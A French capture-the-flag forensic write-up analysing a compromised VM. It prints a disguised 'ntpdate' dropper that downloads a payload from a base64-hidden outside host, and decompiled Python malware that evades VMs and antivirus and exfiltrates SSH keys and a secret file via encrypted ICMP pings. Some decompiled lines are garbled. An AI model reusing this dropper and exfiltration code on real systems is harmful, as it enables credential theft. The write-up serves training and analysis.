---
title: Mission 3 - Forensic
weight: 1
---

# Mission 3 : Forensic 

## Brief de mission
La nouvelle vient d'être annoncée : l'entreprise Quantumcore a été compromise, vraisemblablement à cause d'un exécutable téléchargé sur un appareil issu du shadow IT, dont l'entreprise ignorait l'existence.

Par chance — et grâce à de bons réflexes cyber — un administrateur système a réussi à récupérer une image de la machine virtuelle suspecte, ainsi qu'un fichier de capture réseau (PCAP) juste avant que l'attaquant ne couvre complètement ses traces. À vous d'analyser ces éléments et comprendre ce qu'il s'est réellement passé.

L'entreprise vous met à disposition :
- L'image de la VM compromise
- Le fichier PCAP contenant une portion du trafic réseau suspect

## Premiere recherches 

En regardant les logs et en arrivant sur la machine, on s'aperçoit que : 
- L'attaque a eu lieu entre 14:02 et 14:12 
- l'utilisateur fournit a les droits root sur la machine
- il y a eu plusieurs telechargement de fichiers, notamment un fichier install_npdate.sh qui contient du code malveillant.

## Analyse de install_npdate.sh 


On observe le code suivant : 

```bash 

for _ in $(seq 1 $__CNT); do
    __R="/opt/$(tr -dc A-Za-z0-9 </dev/urandom | head -c 8)"
    mkdir -p "$__R"
    __TMPF+=("$__R")
done

__DST="${__TMPF[$RANDOM % ${#__TMPF[@]}]}"
#
__DL=$(echo "aHR0cDovL3Zhc3RhdGlvbi5udWxsOjgwODAvbnRwZGF0ZV91dGlsLmNweXRob24tMzcucHlj" | base64 -d)
# 
__DLL=$(echo "aHR0cDovL3Zhc3RhdGlvbi5udWxsOjgwODAvcmVhZG1lLm1k" | base64 -d)

if command -v curl >/dev/null 2>&1; then
    curl -fsSL "$__DL" -o "$__DST/.sys"
    curl -fsSL "$__DLL" -o "$__DST/.rdme"
elif command -v wget >/dev/null 2>&1; then
    wget -q "$__DL" -O "$__DST/.sys"
    wget -q "$__DLL" -O "$__DST/.rdme"
else
    echo "[ntpdate] Error: Neither curl nor wget found."
    exit 127
fi

chmod +x "$__DST/.sys"
```

Ce morceau de code installe un executable python dans ‘/opt/????/.sys‘ nous cherchons donc cet executable et passons à la décompilation.


## Decompilation 

Le fichier .pyc compilé, une fois décompilé, donne le résultat suivant : 

```python
# uncompyle6 version 3.9.2
# Python bytecode version base 3.7.0 (3394)
# Decompiled from: Python 3.7.3 (default, Mar 21 2025, 13:10:44) 
# [GCC 12.2.0]
# Embedded file name: nightshade.py
# Compiled at: 2025-03-24 11:04:51
# Size of source mod 2**32: 2358 bytes
import os, subprocess, psutil, base64
from Crypto.Cipher import AES
__k = bytes.fromhex("e8f93d68b1c2d4e9f7a36b5c8d0f1e2a")
__v = bytes.fromhex("1f2d3c4b5a69788766554433221100ff")
__d = "37e0f8f92c71f1c3f047f43c13725ef1"

def __b64d(s):
    return base64.b64decode(s.encode()).decode()


def __p(x):
    return x + bytes([16 - len(x) % 16]) * (16 - len(x) % 16)


def __u(x):
    return x[None[:-x[-1]]]


def __x(h):
    c = AES.new(__k, AES.MODE_CBC, __v)
    return __u(c.decrypt(bytes.fromhex(h))).decode()


def __y(s):
    c = AES.new(__k, AES.MODE_CBC, __v)
    return c.encrypt(__p(s.encode())).hex()


def __chk_vm():
    return False
    try:
        z = open("/sys/class/dmi/id/product_name").read().strip().lower()
        for q in (b'VmlydHVhbEJveA==', b'S1ZN', b'UVFNVQ==', b'Qm9jaHM='):
            if base64.b64decode(q).decode().lower() in z:
                print("ERR VM")
                return True

    except:
        pass

    return False


def __chk_av():
    targets = [
     b'Y2xhbWQ=', b'YXZnZA==', b'c29waG9z', b'RVNFVA==', b'cmtodW50ZXI=']
    try:
        for p in psutil.process_iter(attrs=["name"]):
            n = (p.info["name"] or "").lower()
            for b64av in targets:
                if base64.b64decode(b64av).decode().lower() in n:
                    print("ERR AV")
                    return True

    except:
        pass

    return False


def __exf(path, dst, size=15):
    if not os.path.exists(path):
        return False
    d = open(path, "rb").read()
    segs = [d [i[:i + size]] for i in range(0, len(d), size)]

    for seg in segs:
        try:
            payload = AES.new(__k, AES.MODE_CBC, __v).encrypt(__p(seg)).hex()
            # ping -c 1 -p payload 
            cmd = [__b64d("cGluZw=="), __b64d("LWM="), __b64d("MQ=="), __b64d("LXA="), payload, dst]
            subprocess.run(cmd, stdout=(subprocess.DEVNULL), stderr=(subprocess.DEVNULL))
        except:
            continue

    return True


def __main():
    if not __chk_vm():
        return
        if __chk_av():
            return
    else:
        __kll = [
         "/root/.secret",
         os.path.expanduser("~/.ssh/id_rsa"),
         "/root/.ssh/id_rsa"]
        for f in __kll:
            if os.path.exists(f):
                __exf(f, __x(__d))

        _kkoo = "/root/.secret"
        if os.path.exists(_kkoo):
            try:
                print("clean")
#                os.remove(_kkoo)
            except Exception as e:
                try:
                    pass
                finally:
                    e = None
                    del e


if __name__ == "__main__":
    __main()

```

On observe que cet executable exfiltre des données vers une autre machine. Le fichier `/root/.secret`, qui doit contenir notre drapeau, est envoyé par ICMP. On observe également que le contenu est chiffré mais l'IV et la clé sont disponibles. 

En extrayant les données des paquets via la capture .pcap, on tombe effectivement sur le drapeau que l'on déchiffre avec le code suivant : 

```python
from Crypto.Cipher import AES
import base64

def __b64d(s):
    return base64.b64decode(s.encode()).decode()


key = bytes.fromhex("e8f93d68b1c2d4e9f7a36b5c8d0f1e2a")
iv = bytes.fromhex("1f2d3c4b5a69788766554433221100ff")
HEX= bytes.fromhex("37e0f8f92c71f1c3f047f43c13725ef1")
encoding = "utf-8"


def decrypt(crypted) : 

    cipher = AES.new(key, AES.MODE_CBC, iv)
    # Tronquer à un multiple de 16
    valid_len = len(crypted) - (len(crypted) % 16)
    raw = crypted[:valid_len]

    # Déchiffrement
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(raw)

    # Suppression du padding PKCS#7
    pad_len = decrypted[-1]
    if pad_len > 0 and pad_len <= 16:
        decrypted = decrypted[:-pad_len]

    # Décodage en UTF-8
    try:
        text = decrypted.decode("utf-8")
    except UnicodeDecodeError:
        text = decrypted.decode("utf-8", errors="replace")

    return text


print(decrypt(HEX))


with open("raw_payloads.txt.head","r") as f :
    for l in f.readlines() : 
        payload = l.strip()
        
        print(decrypt(bytes.fromhex(payload)))
```
 